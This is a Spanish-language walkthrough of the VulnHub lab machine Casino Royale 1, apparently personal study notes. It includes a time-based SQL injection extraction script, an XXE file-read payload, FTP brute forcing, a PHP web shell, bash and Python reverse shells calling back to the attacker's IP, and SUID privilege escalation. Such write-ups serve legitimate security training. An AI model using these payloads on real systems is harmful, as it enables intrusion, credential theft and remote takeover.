-------
- Tags: #timesqli #sqli #searchsploit #smtp #correoselectronicos #xxe #ftp #userpivoting #suid
-------
# Explicación e instalación

> En este segundo escenario vamos a estar resolviendo la máquina llamada **Casino Royale 1** que podremos descargar el OVA a través del siguiente [link](https://www.vulnhub.com/entry/casino-royale-1,287/). Cabe destacar que en este caso tendremos que colocar la interfaz de red en modo **Bridged** y **Replicate physical network connection state**.

------
# Resolución

## Reconocimiento

### Enumeración con NMAP

```js
PORT     STATE SERVICE         REASON
21/tcp   open  ftp             syn-ack ttl 64
25/tcp   open  smtp            syn-ack ttl 64
80/tcp   open  http            syn-ack ttl 64
8081/tcp open  blackice-icecap syn-ack ttl 64
```

```js
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: casino.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=casino
| Subject Alternative Name: DNS:casino
| Not valid before: 2018-11-17T20:14:11
|_Not valid after:  2028-11-14T20:14:11
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 2 disallowed entries 
|_/cards /kboard
|_http-server-header: Apache/2.4.25 (Debian)
8081/tcp open  http    PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

### Fuerza bruta para directorios

```
"index.php"
"includes"            
"install"             
"javascript"          
"cards"               
"phpmyadmin"          
"server-status"

phpmyadmin/templates/
phpmyadmin/themes/   
phpmyadmin/doc/      
phpmyadmin/js/       
phpmyadmin/libraries/
phpmyadmin/setup/    
phpmyadmin/sql/      
phpmyadmin/locale/
```

El directorio ``/install`` es el que nos brindó pistas ya que buscando con ``searchsploit PokerMax`` encontramos una vulnerabilidad que dentro del código explica que hay una ruta llamada 

- ``http://192.168.0.25.com/pokerleague/pokeradmin/configure.php``

No es válida en nuestro caso pero si vamos a la ruta ``/pokeradmin/configure.php`` llegamos a un panel de **Login**

------
## Explotación
### Login Bypass / Time SQLI Script

Se puede generar un **Bypass** proporcionando ``admin' or 1=1-- -``, también se puede utilizar un script para hacer una Time SQLI para obtener información de las bases de datos.

```python
#!/usr/bin/python3

import os
import string
import time
import signal
from pwn import *
import requests

# Ctrl+C

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "http://192.168.0.25/pokeradmin/index.php"
characters = string.ascii_lowercase + string.digits + ":_-.,"

def time_sqli():

    extracted_info = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de Inyección SQL")
    time.sleep(2)

    p2 = log.progress("Datos extraídos")

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for position in range(1, 200):
        for character in characters:

            post_data = {
                'op': 'adminlogin',
                'username': "admin' and if(substr(database(),%d,1)='%s', sleep(0.5),1)-- -" % (position, character),
                'password': 'admin' 
            }
                
            p1.status(post_data['username'])

            time_start = time.time()
            r = requests.post(main_url, data=post_data, headers=headers)
            time_end = time.time()

            if time_end - time_start > 0.5:
                extracted_info += character
                p2.status(extracted_info)
                break

    p1.success("Inyección SQL completada exitosamente")
    p2.success(extracted_info)


if __name__ == '__main__':

    time_sqli()
```

**Bases de datos**: ``information_schema, mysql , performance_schema , phpmyadmin , pokerleague,vip ``

- Para listar todas las bases de datos existentes: 
```sql
admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s', sleep(0.5),1)-- -
```
- Para listas todas las tablas de una base de datos especifica:
```sql
admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),%d,1)='%s', sleep(0.5),1)-- -
```
- Para listar todas las columnas de una tabla especifica:
```sql
admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),%d,1)='%s', sleep(0.5),1)-- -
```
- Para listar el contenido de una columna especifica:
```sql
admin' and if(substr((select group_concat(username,0x3a,password) from pokerleague.pokermax_admin),%d,1)='%s', sleep(0.5),1)-- -
```

----

Si nos dirigimos a la sección de ``Manage Players`` podremos ver todos los usuarios, entre ellos destaca el usuario Valenka que nos permite enviarle un correo. Si observamos la información de dicho correo veremos que nos da la ruta ``/vip-client-portfolios/?uri=blog`` por lo tanto accedemos a ella.

-------
### SMTP Service

Dentro de la ruta que nos brindo el usuario Valenka, encontramos en una de las secciones de los Blogs una explicación sobre como enviarle correos a Valenka en caso de querer ser parte de la empresa, para esto da un par de instrucciones e indica que cada cierto tiempo ella revisa los correos.

![[MV 4.png]]

Por lo tanto como nosotros previamente vimos que el servicio **SMTP estaba abierto** vamos hacia el y probamos enviarle un correo. ==Cabe destacar que a veces el servicio SMTP no valida si el correo nuestro es legítimo, en este caso no lo valida==. Dentro del correo proporcionamos un link ya que sabemos que Valenka revisa seguido su buzón, y que abre los links que le envían.

En el siguiente ejemplo referencio a un archivo ``cookie.js`` pero es a modo explicativo.

![[MV 1.png]]

Si enviamos el correo y mientras nosotros tenemos abierto un **servidor** con python3 ofreciendo un archivo, en mi caso el ``cookie.js``, veremos que luego de enviar el correo Valenka ingresa al link, por lo tanto podemos intentar acontecer que Valenka al ingresar al link que le enviemos **genere algo a nuestro favor en la web**, es decir un **CSRF**.

Con ``searchsploit`` buscamos vulnerabilidades para **Snow fox** y utilizamos dicho exploit para acontecer un **CSRF** compartiendo dicho script con nuestro servidor montado en python. De esta forma al enviarle un correo a Valenka con el url exacto de donde está nuestro script de searchsploit podremos hacer que **Valenka cree una cuenta con privilegios**.

-----
### XXE 

Una vez dentro de la cuenta que hemos creado con el Exploit podremos listar información de los usuarios privilegiados, en uno de ellos en su descripción nos otorgara una ruta válida de la web que desconocíamos. Dentro de esta web al ver el **código fuente** nos indican que podemos tramitar peticiones por **POST** para que sean interpretadas, **siendo así válida una XXE ya que los archivos XML son válidos**.

Para realizar todo lo anterior es necesario que representemos de forma manual los diferentes tipos de datos que nos indica la web como "pistas".

![[MV 2.png]]

Por lo tanto lo que haremos será agregar la siguiente cadena al inicio de la estructura XML.

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> 
```

Después hacemos una llamada a esa entidad ``xxe`` que hemos creado con ``&xxe;`` colocando dicha cadena en el campo que veíamos que se reflejaba en la respuesta. De estar todo correcto, deberíamos ver el ``/etc/passwd``.

![[MV 3.png]]

Vemos que hay un usuario llamado ``ftpUserULTRA`` por lo tanto al ser un nombre tan llamativo haciendo referencia al servicio FTP que recordemos que está **ABIERTO**, probaremos un ataque de fuerza bruta con la herramienta ``hydra`` para ver si conseguimos su credencial.

- ``hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.25 -t 20``

### FTP Service

Para que tengan en cuenta, la contraseña está cerca de la línea número *48.000* por lo tanto la fuerza bruta tardará aproximadamente tres horas, hay que tener paciencia.

La contraseña es: `bankbank`

------

Recordemos que nosotros de la web ``http://casino-royale.local/ultra-access-view/main.php`` retrocedimos un directorio a ``http://casino-royale.local/ultra-access-view``, y al entrar al servicio **FTP** y hacer un ``ls`` veremos que están los **mismos directorios** que en la web, por lo tanto podemos aprovecharnos de esto.

Una vez dentro del servicio FTP podemos meter un archivo ``php`` malicioso para que nos lo interprete y de esta forma sea ejecutado por nosotros desde la web, en este archivo colocaremos una instrucción que nos entable ejecución remota de comandos.

```php
<?php
	system($_GET['cmd'])
?>
```

Si intentamos de primeras subir el archivo con ``put cmd.php`` no vamos a poder, porque por detrás hay algún tipo de protección que no permite traer archivos con extensiones, por lo tanto subiremos el archivo pero con nombre ``cmd``. 
Una vez hecho lo anterior podemos **renombrar el archivo** desde dentro del servicio **FTP** de ``cmd`` a ``cmd.php``, esto lo podemos hacer con ``rename``, si lo intentamos veremos que no podemos ya que la sanitización del servicio se ve que evita los archivos con extensión ``php``, por lo tanto probaremos con otras extensiones de ``php`` que son válidas también, para esto podemos apoyarnos de la unidad de [[Abuso de subida de archivos]].

En mi caso la extensión que funcionó fue ``php4`` por lo tanto ahora solo quedaría ir a la web, abrir el archivo que hemos subido y probar el parámetro ``?cmd=`` en la **URL** para intentar inyectar comandos.

![[MV 5.png]]

Ahora solo quedaría entablar la **Reverse Shell** primero poniéndonos en escucha con ``nc -nlvp 443``

![[MV 6.png]]

- ``casino-royale.local/ultra-access-view/test/cmd.php4?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.0.194/443 0>%261'``

![[MV 7.png]]

Ahora solo quedaría la etapa de escalada de privilegios.

## Escalada de privilegios

**Tratamiento de la shell para poder ver todo mas cómodo.**

- ``script /dev/null -c bash``
- ``CTRL + Z``
- ``stty raw -echo; fg``
- ``reset xterm``
- ``stty size`` (En nuestra máquina y colocar el siguiente comando con las medidas que nos dio este)
- ``export TERM=xterm``
- ``export SHELL=bash``
- ``stty rows 41 columns 184``
- ``export TERM=xterm`` (Para el clear de consola)

-----
### Método 1 para ganar acceso al usuario root
#### User Pivoting al usuario ``le``

Explorando en el sistema los archivos con privilegios SUID encontré una ruta en ``/opt/casino-royale`` dentro de está ruta hay variedad de archivos, entre ellos se encuentra uno llamado ``php-web-start.sh`` con propietario ``le`` que al hacerle un ``cat`` vemos que está montando un servidor web por el **puerto 8081**, al ir a esa web vemos un botón que dice ``Run Data Collect`` que al darle click si miramos la **URL** vemos que ejecuta el script ``collect.php``. Por lo tanto al ver el código del archivo ``collect.php`` vemos que está ejecutando un archivo llamado ``casino-data-collection.py`` en el cual **tenemos permiso de escritura** como usuario ``www-data`` y el propietario es ``le``, debido a esto **modificaremos el script de python** colocándole la siguiente instrucción para entablar otra **Reverse Shell** pero que nos brinde una consola como el usuario ``le``.

```python
/usr/bin/python

import socket
import os
import subprocess

s = socket.socket()
s.connect(("192.168.0.194", 443))  # Reemplaza TU_IP_EXTERNA y PUERTO
os.dup2(s.fileno(), 0)  # Redirige stdin
os.dup2(s.fileno(), 1)  # Redirige stdout
os.dup2(s.fileno(), 2)  # Redirige stderr
subprocess.call(["/bin/sh", "-i"])  # Lanza una shell interactiva
```

Nos colocamos en escucha por el *puerto 443*.
Ahora solo queda darle click al botón de la web que dice ``Run Data Collect`` para que nos interprete el archivo ``casino-data-collection.py`` que posee nuestra **Reverse Shell**.

![[MV 8.png]]

![[MV 9.png]]

Ya somos el usuario ``le`` ahora tenemos que buscar una vía potencial de volvernos el usuario ``root`` para concluir con la máquina.

-----
#### User Pivoting al usuario ``root`` desde el usuario ``le``

Si prestamos atención al script ``mi6_detect_test`` y lo ejecutamos, vemos que el usuario root al final está intentando ejecutar el script ``run.sh`` en el que somos propietarios como ``le``, por lo tanto podemos intentar manipular ese script para que al ejecutar ``mi16_detect_test`` y el usuario **root** ejecute ``run.sh`` nos brinde una consola interactiva como privilegiados. 

![[MV 10.png]]

La cadena que colocaremos en ``run.sh`` será la siguiente.

- ``/bin/bash -p``

Luego **ejecutamos al archivo SUID** nuevamente por lo que vamos a ver los dos OUTPUTS, ya que el archivo ``mi6_detect_test`` lo que hace es ejecutarse a si mismo y luego a ``run.sh``, que por lo que se ve poseen el mismo código ya que son casi iguales sus respuestas. Pero además de todo lo anterior, como nosotros colocamos en el archivo ``/bin/bash -p`` ganaremos acceso al usuario **root**.

![[MV 11.png]]

![[MV 12.png]]

### Método 2 para ganar acceso al usuario root

Una vez ganamos acceso a la máquina como el usuario ``www-data`` podemos observar el directorio ``/var/www/html/``, en este veremos gran cantidad de recursos que son los que gestionan todas las web por donde nos estuvimos moviendo. 
Por lo tanto filtraremos por archivos ``config`` que suelen ser archivos similares a los ``wp-config.php`` cuando vulneramos un CMS **Wordpress**, en estos archivos se almacenan datos sensibles y/o credenciales.

![[MV 13.png]]

Ahora podemos hacerles un cat a todos y colocar un ``less -S`` para que se muestre en formato ``paginated`` y ``-r`` para que interprete los caracteres raros ya que hay algunas letras en chino.

- ``find -name \*config\* 2>/dev/null | xargs cat | less -S -r``

------- 

Aislado a esto, si buscamos por archivos SUID ``find / -perm -4000 2>/dev/null`` veremos un archivo que llama la atención con nombre ``/opt/casino-royale/mi6_detect_test`` si lo intentamos ejecutar nos dice que no encuentra el archivo ``run.sh``.

![[MV 14.png]]

Podríamos buscar más información acerca del **binario SUID** haciendo un ``strings /opt/casino-royale/mi6_detect_test | less -S``

![[MV 15.png]]

Por lo tanto podríamos ir al directorio ``/tmp/`` y crear un ``run.sh`` ya que el binario SUID **ejecuta a dicho archivo**. De esta forma podríamos colocarle un código que nos de una **Bash privilegiada** y a la hora de ejecutar el binario ``mi6_detect_test`` root ejecutará nuestro ``run.sh`` del directorio actual, es decir nuestro ``run.sh`` malicioso, de esta forma ganaríamos acceso al usuario privilegiado.

```bash
#!/bin/bash

/bin/bash -p
```

Ahora simplemente queda **ejecutar** el binario SUID para que nos ejecute nuestro ``run.sh``.

![[MV 16.png]]